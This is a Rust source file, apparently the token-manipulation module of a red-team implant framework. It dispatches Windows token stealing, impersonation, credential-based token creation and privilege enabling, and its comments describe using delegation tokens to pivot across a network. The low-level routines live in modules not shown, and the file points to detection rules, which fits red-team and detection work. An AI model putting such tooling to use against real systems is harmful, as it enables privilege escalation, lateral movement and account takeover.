//! Token manipulation module (Phase 7)
//!
//! Provides Windows token stealing, synthesis, impersonation, and privilege
//! escalation primitives for use during authorised red team operations.
//!
//! ## Operations
//! | Function           | Win32 APIs used                                          |
//! |--------------------|----------------------------------------------------------|
//! | `steal_token`      | OpenProcess, OpenProcessToken, DuplicateTokenEx          |
//! | `make_token`       | LogonUserW (LOGON32_LOGON_NEW_CREDENTIALS)               |
//! | `impersonate`      | ImpersonateLoggedOnUser                                  |
//! | `rev2self`         | RevertToSelf                                             |
//! | `enable_privilege` | OpenProcessToken, LookupPrivilegeValueW, AdjustTokenPrivileges |
//!
//! ## Token store
//! Duplicated/synthesised handles are kept in a process-wide `HashMap<u32,
//! StoredToken>` (see `store` module) and referenced by a monotonic u32 ID.
//!
//! ## Network pivot capability
//! `steal_token` uses `SecurityDelegation` + `TokenPrimary` so the resulting
//! token can authenticate to remote resources (Kerberos delegation).
//!
//! ## Detection rules
//! wiki/detection/sigma/kraken_token_ops.yml
//! wiki/detection/yara/kraken_token.yar

pub mod handle;
pub mod ops;
pub mod store;

pub use ops::{enable_privilege, impersonate, make_token, rev2self, steal_token};
pub use store::StoredToken;

use common::{KrakenError, Module, ModuleId, TaskId, TaskResult, TokenOutput};
#[cfg(windows)]
use common::StoredTokenInfo as CommonStoredTokenInfo;
use prost::Message;
use protocol::{TokenTask, token_task::Operation};

/// Enumerate all tokens currently held in the token store.
///
/// Returns a sorted `Vec<StoredToken>` (by ascending ID).
pub fn list_tokens() -> Result<Vec<StoredToken>, KrakenError> {
    store::list()
}

// ---------------------------------------------------------------------------
// Module trait implementation for runtime loading
// ---------------------------------------------------------------------------

/// Token module for runtime loading
pub struct TokenModule {
    id: ModuleId,
}

impl TokenModule {
    pub fn new() -> Self {
        Self {
            id: ModuleId::new("token"),
        }
    }
}

impl Default for TokenModule {
    fn default() -> Self {
        Self::new()
    }
}

impl Module for TokenModule {
    fn id(&self) -> &ModuleId {
        &self.id
    }

    fn name(&self) -> &'static str {
        "Token"
    }

    fn version(&self) -> &'static str {
        env!("CARGO_PKG_VERSION")
    }

    fn handle(&self, _task_id: TaskId, task_data: &[u8]) -> Result<TaskResult, KrakenError> {
        let task: TokenTask = TokenTask::decode(task_data)
            .map_err(|e| KrakenError::Protocol(e.to_string()))?;

        let operation = task.operation
            .ok_or_else(|| KrakenError::Module("TokenTask missing operation".into()))?;

        // Token operations are async, use block_in_place to run them synchronously
        let result = tokio::task::block_in_place(|| {
            let rt = tokio::runtime::Handle::try_current()
                .map_err(|_| KrakenError::Module("no tokio runtime available".into()))?;
            rt.block_on(self.handle_operation(operation))
        })?;

        Ok(result)
    }
}

impl TokenModule {
    async fn handle_operation(&self, operation: Operation) -> Result<TaskResult, KrakenError> {
        let output = match operation {
            Operation::Steal(steal) => self.execute_steal(steal.target_pid).await,
            Operation::Make(make) => {
                self.execute_make(&make.username, &make.password, make.domain.as_deref()).await
            }
            Operation::Impersonate(imp) => self.execute_impersonate(imp.token_id).await,
            Operation::Rev2self(_) => self.execute_rev2self().await,
            Operation::EnablePriv(priv_req) => self.execute_enable_priv(&priv_req.privilege).await,
            Operation::List(_) => self.execute_list(),
        };
        Ok(TaskResult::Token(output))
    }

    #[cfg(windows)]
    async fn execute_steal(&self, target_pid: u32) -> TokenOutput {
        match steal_token(target_pid).await {
            Ok(token_id) => TokenOutput {
                success: true,
                token_id: Some(token_id),
                username: None,
                tokens: vec![],
                error: None,
            },
            Err(e) => TokenOutput {
                success: false,
                token_id: None,
                username: None,
                tokens: vec![],
                error: Some(e.to_string()),
            },
        }
    }

    #[cfg(windows)]
    async fn execute_make(&self, username: &str, password: &str, domain: Option<&str>) -> TokenOutput {
        let username_owned = username.to_string();
        let password_owned = password.to_string();
        let domain_owned = domain.unwrap_or(".").to_string();
        let display_name = format!("{}\\{}", domain_owned, username_owned);
        match make_token(username_owned, password_owned, domain_owned).await {
            Ok(token_id) => TokenOutput {
                success: true,
                token_id: Some(token_id),
                username: Some(display_name),
                tokens: vec![],
                error: None,
            },
            Err(e) => TokenOutput {
                success: false,
                token_id: None,
                username: None,
                tokens: vec![],
                error: Some(e.to_string()),
            },
        }
    }

    #[cfg(windows)]
    async fn execute_impersonate(&self, token_id: u32) -> TokenOutput {
        match impersonate(token_id).await {
            Ok(()) => TokenOutput {
                success: true,
                token_id: Some(token_id),
                username: None,
                tokens: vec![],
                error: None,
            },
            Err(e) => TokenOutput {
                success: false,
                token_id: None,
                username: None,
                tokens: vec![],
                error: Some(e.to_string()),
            },
        }
    }

    #[cfg(windows)]
    async fn execute_rev2self(&self) -> TokenOutput {
        match rev2self().await {
            Ok(()) => TokenOutput {
                success: true,
                token_id: None,
                username: None,
                tokens: vec![],
                error: None,
            },
            Err(e) => TokenOutput {
                success: false,
                token_id: None,
                username: None,
                tokens: vec![],
                error: Some(e.to_string()),
            },
        }
    }

    #[cfg(windows)]
    async fn execute_enable_priv(&self, privilege: &str) -> TokenOutput {
        match enable_privilege(privilege.to_string()).await {
            Ok(()) => TokenOutput {
                success: true,
                token_id: None,
                username: None,
                tokens: vec![],
                error: None,
            },
            Err(e) => TokenOutput {
                success: false,
                token_id: None,
                username: None,
                tokens: vec![],
                error: Some(e.to_string()),
            },
        }
    }

    #[cfg(windows)]
    fn execute_list(&self) -> TokenOutput {
        match list_tokens() {
            Ok(stored) => {
                let tokens: Vec<CommonStoredTokenInfo> = stored
                    .into_iter()
                    .map(|t| {
                        let (username, source_pid) = if t.source.starts_with("steal:") {
                            let pid_str = t.source.trim_start_matches("steal:");
                            let pid = pid_str.parse::<u32>().unwrap_or(0);
                            (String::new(), pid)
                        } else if t.source.starts_with("make:") {
                            let user = t.source.trim_start_matches("make:").to_string();
                            (user, 0)
                        } else {
                            (String::new(), 0)
                        };
                        CommonStoredTokenInfo {
                            id: t.id,
                            username,
                            source: t.source,
                            source_pid,
                        }
                    })
                    .collect();
                TokenOutput {
                    success: true,
                    token_id: None,
                    username: None,
                    tokens,
                    error: None,
                }
            }
            Err(e) => TokenOutput {
                success: false,
                token_id: None,
                username: None,
                tokens: vec![],
                error: Some(e.to_string()),
            },
        }
    }

    // Non-Windows stubs
    #[cfg(not(windows))]
    async fn execute_steal(&self, _target_pid: u32) -> TokenOutput {
        TokenOutput {
            success: false,
            token_id: None,
            username: None,
            tokens: vec![],
            error: Some("token operations only supported on Windows".into()),
        }
    }

    #[cfg(not(windows))]
    async fn execute_make(&self, _username: &str, _password: &str, _domain: Option<&str>) -> TokenOutput {
        TokenOutput {
            success: false,
            token_id: None,
            username: None,
            tokens: vec![],
            error: Some("token operations only supported on Windows".into()),
        }
    }

    #[cfg(not(windows))]
    async fn execute_impersonate(&self, _token_id: u32) -> TokenOutput {
        TokenOutput {
            success: false,
            token_id: None,
            username: None,
            tokens: vec![],
            error: Some("token operations only supported on Windows".into()),
        }
    }

    #[cfg(not(windows))]
    async fn execute_rev2self(&self) -> TokenOutput {
        TokenOutput {
            success: false,
            token_id: None,
            username: None,
            tokens: vec![],
            error: Some("token operations only supported on Windows".into()),
        }
    }

    #[cfg(not(windows))]
    async fn execute_enable_priv(&self, _privilege: &str) -> TokenOutput {
        TokenOutput {
            success: false,
            token_id: None,
            username: None,
            tokens: vec![],
            error: Some("token operations only supported on Windows".into()),
        }
    }

    #[cfg(not(windows))]
    fn execute_list(&self) -> TokenOutput {
        TokenOutput {
            success: false,
            token_id: None,
            username: None,
            tokens: vec![],
            error: Some("token operations only supported on Windows".into()),
        }
    }
}

// For dynamic loading support
#[cfg(feature = "dynamic-entry")]
common::kraken_module_entry!(TokenModule);

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn list_tokens_returns_vec() {
        // On any platform the store is accessible; just verify the API shape.
        let tokens = list_tokens().unwrap();
        // May already contain entries from other tests; just check it compiles
        // and returns a Vec.
        let _ = tokens;
    }

    #[cfg(not(windows))]
    #[test]
    fn non_windows_ops_return_error() {
        let rt = tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()
            .unwrap();

        let e = rt.block_on(steal_token(1)).unwrap_err();
        assert!(e.to_string().contains("only supported on Windows"));

        let e = rt.block_on(make_token("user", "pass", "domain")).unwrap_err();
        assert!(e.to_string().contains("only supported on Windows"));

        let e = rt.block_on(impersonate(1)).unwrap_err();
        assert!(e.to_string().contains("only supported on Windows"));

        let e = rt.block_on(rev2self()).unwrap_err();
        assert!(e.to_string().contains("only supported on Windows"));

        let e = rt.block_on(enable_privilege("SeDebugPrivilege")).unwrap_err();
        assert!(e.to_string().contains("only supported on Windows"));
    }
}
